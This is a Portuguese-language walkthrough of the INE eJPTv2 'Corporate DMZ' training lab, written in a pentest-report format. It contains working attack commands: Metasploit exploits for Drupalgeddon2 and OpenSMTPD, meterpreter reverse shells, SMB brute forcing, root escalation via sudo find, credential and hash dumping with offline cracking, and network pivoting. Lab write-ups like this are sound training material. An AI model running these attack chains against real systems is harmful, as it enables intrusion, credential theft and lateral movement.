# Corporate DMZ Lab

Plataforma: INE / eJPTv2

---

## RECON

### [nmap] Descoberta de Hosts - varredura DMZ
```
nmap -sn 192.168.100.0/24 -oN hosts.txt
nmap -sS --min-rate 5000 -T4 --open -Pn -n 192.168.100.0/24
nmap -sCV -p21,22,25,80,139,445,3306,3389 -oN services.txt 192.168.100.50,51,52,55,63,67

# Hosts descobertos:
# 192.168.100.50 - WINSERVER-01 - Win 2012 R2 - Apache/WordPress, SMB, RDP, MySQL
# 192.168.100.51 - WINSERVER-02 - Win 2012 R2 - FTP, IIS/WebDAV, SMB, RDP
# 192.168.100.52 - LINUX-01     - Ubuntu 20.04 - FTP, SSH, SMTP, Apache/Drupal, SMB, MySQL, RDP
# 192.168.100.55 - WINSERVER-03 - Win 2019     - IIS, SMB, RDP
# 192.168.100.63 - EC2AMAZ-IK4QFED - Windows  - RDP
# 192.168.100.67 - LINUX-02     - Ubuntu       - SSH
```

---

## ENUM

### [smb] Enumeração SMB - enum4linux
```
enum4linux -a 192.168.100.52

# Política de senhas:
#   Tamanho mínimo: 5
#   Complexidade: DESATIVADA
#   Histórico: Nenhum
#   Bloqueio de conta: NENHUM

# Verificação de assinatura SMB
nmap -p445 --script smb-security-mode 192.168.100.50-52
# message_signing: disabled (F-09 - Médio)
```

### [web] Fingerprint versão Drupal - 192.168.100.52
```
curl http://192.168.100.52/drupal/CHANGELOG.txt
# Retorna: Drupal 7.57  →  CVE-2018-7600 (Drupalgeddon2) confirmado

# Verificação de métodos WebDAV - 192.168.100.51
curl -X OPTIONS http://192.168.100.51/ -v
# Allow: OPTIONS, TRACE, GET, HEAD, PUT, DELETE, MKCOL, LOCK, UNLOCK, PROPFIND
```

### [http] FTP Anônimo + webroot IIS - 192.168.100.51
```
ftp 192.168.100.51
# Usuário: anonymous / (sem senha)
# Arquivos encontrados:
#   cmdasp.aspx   ← web shell pré-instalada!
#   iisstart.htm
#   robots.txt.txt
#   aspnet_client/

# Web shell acessível em:
# http://192.168.100.51/cmdasp.aspx
# Contexto: IIS APPPOOL\DefaultAppPool
```

### [nmap] Detecção OpenSMTPD - 192.168.100.52
```
nmap -sCV -p25 192.168.100.52
# 25/tcp open  smtp  OpenSMTPD (protocol 220)
# Banner: OpenSMTPD 2.0.0  →  CVE-2020-7247 confirmado
```

---

## EXPLOIT

### [cmd] [F-02 CRIT] WebShell via FTP Anônimo - 192.168.100.51
```
# Cadeia A - Caminho mais rápido (<5 min desde o recon)
# 1. FTP anônimo → encontrar cmdasp.aspx
# 2. Acessar http://192.168.100.51/cmdasp.aspx
# 3. Executar: whoami → iis apppool\defaultapppool

# Upgrade para Meterpreter:
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.100.5
set LPORT 4444
run
```

### [cmd] [F-01 CRIT] CVE-2018-7600 Drupalgeddon2 - 192.168.100.52
```
use exploit/unix/webapp/drupal_drupalgeddon2
set RHOSTS 192.168.100.52
set TARGETURI /drupal/
set LHOST 192.168.100.5
run
# Resultado: sessão Meterpreter aberta como www-data
```

### [cmd] [F-03 CRIT] CVE-2020-7247 OpenSMTPD RCE - 192.168.100.52
```
use exploit/unix/smtp/opensmtpd_mail_from_rce
set RHOSTS 192.168.100.52
set LHOST 192.168.100.5
run
# SMTP porta 25 - vetor alternativo ao Drupalgeddon2
```

### [smb] [F-04 HIGH] Força Bruta SMB - 192.168.100.55
```
# crackmapexec
crackmapexec smb 192.168.100.55 -u userlist.txt -p rockyou.txt

# Metasploit
use auxiliary/scanner/smb/smb_login
set RHOSTS 192.168.100.55
set USER_FILE /path/to/users.txt
set PASS_FILE /path/to/passwords.txt
run
# Sem política de bloqueio → tentativas ilimitadas
```

---

## POST-EXP

### [cmd] [F-05 HIGH] Escalação de privilégio via sudo find - 192.168.100.52
```
# Verificar permissões sudo a partir do shell www-data
sudo -l
# (root) NOPASSWD: /usr/bin/find

# Escalar para root
sudo find . -exec /bin/bash \; -quit
whoami
# root

# Fazer upgrade do shell antes, se necessário:
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### [cmd] [F-06 HIGH] MySQL exposto - dump de credenciais Drupal
```
# Ler credenciais do banco via config do Drupal (como www-data)
cat /var/www/html/drupal/sites/default/settings.php
# database / username / password → credenciais do banco

# Conectar remotamente (ou via shell)
mysql -h 192.168.100.52 -u drupal -p
USE drupal;
SELECT name, pass, mail FROM users;
# 4 contas: admin, auditor, dbadmin, vincenzo
# Hashes: SHA-512 (formato Drupal)
```

### [cmd] Pivot - Rede interna via Meterpreter
```
# Confirmar host dual-homed
ip addr
# eth1: 172.21.x.x  ← interface da rede interna

# Adicionar rota no Metasploit
run post/multi/manage/autoroute SUBNET=172.21.0.0 NETMASK=255.255.0.0

# Proxy SOCKS
use auxiliary/server/socks_proxy
set SRVPORT 1080
set VERSION 5
run -j

# Varrer rede interna via pivot
proxychains nmap -sT -Pn 192.168.1.0/24
# Porta 10000 (Webmin) encontrada nos hosts internos
```

---

## CREDS

### [cred] Credenciais obtidas
```
# Força bruta SMB - WINSERVER-03
serviço: SMB/RDP
host: 192.168.100.55
usuário: [via crackmapexec]
senha: [via rockyou.txt]

# MySQL / Drupal DB
host: 192.168.100.52
serviço: MySQL
usuário: drupal
senha: [em settings.php]

# Hashes dos usuários Drupal (SHA-512)
admin@syntex.com
auditor@syntex.com
dbadmin@syntex.com
vincenzo@syntext.com

# Quebrar offline:
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=drupal7
hashcat -m 7900 hashes.txt rockyou.txt
```

---

## FLAGS

### [flag] Findings por severidade
```
[CRÍTICO]  F-01 CVE-2018-7600 Drupalgeddon2 - 192.168.100.52 - CVSS 9.8
[CRÍTICO]  F-02 WebShell via FTP Anônimo - 192.168.100.51 - CVSS 9.8
[CRÍTICO]  F-03 CVE-2020-7247 OpenSMTPD RCE - 192.168.100.52 - CVSS 9.8
[ALTO]     F-04 Força Bruta SMB / Política fraca - 192.168.100.55 - CVSS 8.1
[ALTO]     F-05 Escalação via sudo find - 192.168.100.52 - CVSS 7.8
[ALTO]     F-06 MySQL exposto + credenciais fracas - 192.168.100.52 - CVSS 7.5
[MÉDIO]    F-07 FTP anônimo com acesso ao webroot - 192.168.100.51 - CVSS 6.5
[MÉDIO]    F-08 WebDAV com métodos perigosos - 192.168.100.51 - CVSS 6.5
[MÉDIO]    F-09 SMB Signing desativado - .50/.51/.52 - CVSS 5.9
[MÉDIO]    F-10 Directory Listing IIS ativado - 192.168.100.51 - CVSS 5.3
[BAIXO]    F-11 FTP anônimo - divulgação de informações - 192.168.100.52 - CVSS 4.3
[INFO]     F-12 Drupal 7.57 desatualizado
[INFO]     F-13 OpenSMTPD desatualizado
```

---

## NOTES

### [note] Resumo das cadeias de ataque
```
Cadeia A - WINSERVER-02 (<5 min)
FTP anônimo → cmdasp.aspx → RCE no SO → Meterpreter

Cadeia B - Comprometimento total do LINUX-01
Drupalgeddon2 → shell www-data → sudo find → root
→ settings.php → MySQL → hashes SHA-512 → crack → SSH

Cadeia C - Pivot para rede interna
root@192.168.100.52 → ip addr eth1:172.21.x.x
→ autoroute + SOCKS5 → proxychains nmap 192.168.1.0/24
→ Webmin (porta 10000) → rede interna comprometida

MITRE ATT&CK:
T1190     Exploit de aplicação exposta
T1505.003 Web Shell
T1110.003 Pulverização de senhas
T1003     Dump de credenciais
T1548.003 Abuso de Sudo
T1090.003 Proxy multi-salto (Pivot)
T1046     Descoberta de serviços de rede
```
